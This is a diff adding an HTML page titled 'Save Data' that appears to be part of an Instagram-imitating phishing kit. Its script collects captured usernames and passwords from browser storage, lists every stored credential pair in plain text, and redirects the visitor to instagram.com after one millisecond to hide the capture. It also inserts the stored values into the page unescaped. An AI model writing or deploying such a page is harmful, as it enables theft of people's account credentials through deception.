@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Save Data</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .data-box {
+    background-color: white;
+    border: 1px solid #dbdbdb;
+    padding: 20px 40px;
+    width: 350px;
+    text-align: center;
+  }
+  .data-item {
+    margin-bottom: 10px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    position: relative;
+  }
+  .delete-btn {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    background-color: red;
+    color: white;
+    border: none;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+  <div class="data-box">
+    <h2>User Data</h2>
+    <div id="dataContainer"></div>
+  </div>
+
+<script>
+  const dataContainer = document.getElementById('dataContainer');
+  let allData = JSON.parse(localStorage.getItem('allUserData')) || [];
+
+  function renderData() {
+    dataContainer.innerHTML = '';
+    allData.forEach((data, index) => {
+      const dataItem = document.createElement('div');
+      dataItem.classList.add('data-item');
+      dataItem.innerHTML = `
+        <p><strong>Username:</strong> ${data.username}</p>
+        <p><strong>Password:</strong> ${data.password}</p>
+        <button class="delete-btn" onclick="deleteData(${index})">X</button>
+      `;
+      dataContainer.appendChild(dataItem);
+    });
+  }
+
+  function deleteData(index) {
+    allData.splice(index, 1);
+    localStorage.setItem('allUserData', JSON.stringify(allData));
+    renderData();
+  }
+
+  const userData = JSON.parse(localStorage.getItem('userData'));
+  if (userData) {
+    allData.push(userData);
+    localStorage.setItem('allUserData', JSON.stringify(allData));
+    localStorage.removeItem('userData');
+  }
+
+  renderData();
+
+  // Redirect to Instagram after 1 millisecond
+  setTimeout(() => {
+    window.location.href = 'https://www.instagram.com';
+  }, 1);
+</script>
+
+</body>
+</html>
